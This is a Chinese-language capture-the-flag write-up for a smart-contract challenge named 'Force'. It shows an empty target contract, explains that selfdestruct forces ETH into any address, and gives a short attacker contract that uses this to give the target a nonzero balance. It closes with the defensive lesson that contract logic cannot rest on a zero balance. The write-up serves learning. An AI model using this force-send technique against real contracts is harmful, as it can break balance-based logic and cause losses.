# Force

## SourceCode
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

## Requirements
使合约的余额大于0

## Analysis
可以看到合约并没有实现`receive`或`fallback`,并不能收款.但是还有另一种情况:合约调用[selfdestruct](https://github.com/AmazingAng/WTF-Solidity/blob/main/26_DeleteContract/readme.md)时指定的地址会强制接收合约内的余额.

## Attack Steps
1. 实现一个带有`selfdestruct`方法合约并指定销毁后接收地址.
2. 向合约转入ETH
3. 调用自毁函数

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    function attack(address payable _force) external {
        selfdestruct(_force);
    }

    receive() external payable {}
}
```

没有发什么办法可以阻止攻击者通过自毁的方法向合约发送 ether, 所以, 不要将任何合约逻辑基于 `address(this).balance == 0` 之上.


